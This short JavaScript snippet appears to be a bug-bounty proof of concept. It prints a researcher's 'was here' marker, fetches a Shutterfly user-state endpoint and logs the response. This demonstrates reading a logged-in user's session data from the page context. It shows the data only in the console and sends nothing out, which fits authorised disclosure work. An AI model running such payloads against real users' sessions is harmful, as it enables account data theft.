console.log(">>>> Kharaone@wearehackerone.com was here");
response = await fetch("https://www.shutterfly.com/userstate/query.sfly");
console.log(await response.text());
